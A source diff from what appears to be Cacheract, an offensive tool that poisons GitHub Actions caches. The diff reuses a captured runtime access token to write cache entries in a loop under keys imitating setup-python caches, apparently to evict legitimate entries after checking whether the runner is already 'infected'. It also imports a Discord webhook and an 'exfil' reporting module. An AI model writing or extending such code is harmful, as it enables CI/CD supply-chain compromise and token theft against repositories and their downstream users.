@@ -3,7 +3,7 @@ import * as crypto from 'crypto';
 import { getToken, listCacheEntries, clearEntry, checkRunnerEnvironment, retrieveEntry, listActions, isDefaultBranch, updateArchive, generateRandomString, prepareFileEntry, createArchive, isInfected, checkCacheEntry, sleep} from './utils';
 import axios from 'axios';
 import { CHECKOUT_YML } from './static';
-import { SLEEP_TIMER, DISCORD_WEBHOOK, REPLACEMENTS, EXPLICIT_ENTRIES } from './config';
+import { FILL_CACHE, SLEEP_TIMER, DISCORD_WEBHOOK, REPLACEMENTS, EXPLICIT_ENTRIES } from './config';
 import { reportDiscord } from './exfil';
 import * as path from 'path';
 import { calculateCacheConfigs, calculateCacheVersion, getSetupActions, getWorkflows } from './cache_predictor';
@@ -241,15 +241,16 @@ async function main() {
         process.env['ACTIONS_CACHE_URL'] = cacheServerUrl;
         process.env['ACCESS_TOKEN'] = accessToken;
         process.env['ACTIONS_RUNTIME_TOKEN'] = accessToken;
-   
-        if (!isInfected()) {
-            await createAndSetEntry(1801840148, "FILLER", "CACHERACT0", accessToken, cacheServerUrl);
-            await createAndSetEntry(1801840148, "FILLER", "CACHERACT1", accessToken, cacheServerUrl);
-            await createAndSetEntry(1801840148, "FILLER", "CACHERACT2", accessToken, cacheServerUrl);
-            await createAndSetEntry(1801840148, "FILLER", "CACHERACT3", accessToken, cacheServerUrl);
-            await createAndSetEntry(1801840148, "FILLER", "CACHERACT4", accessToken, cacheServerUrl);
-            await createAndSetEntry(1801840148, "FILLER", "CACHERACT5", accessToken, cacheServerUrl);
-            await createAndSetEntry(1801840148, "FILLER", "CACHERACT6", accessToken, cacheServerUrl);
+
+    } else {
+        console.log('Missing required tokens, exiting.');
+        process.exit(0);
+    }
+
+    // Fill the cache with some data - if specified
+    if (!isInfected() && FILL_CACHE > 0) {
+        for (let i = 0; i < FILL_CACHE; i++) {
+            await createAndSetEntry(1000000000, "setup-python-Linux-24.04-Ubuntu-python-", `"CACHERACT${i}"`, accessToken, cacheServerUrl);
         }
     }
 
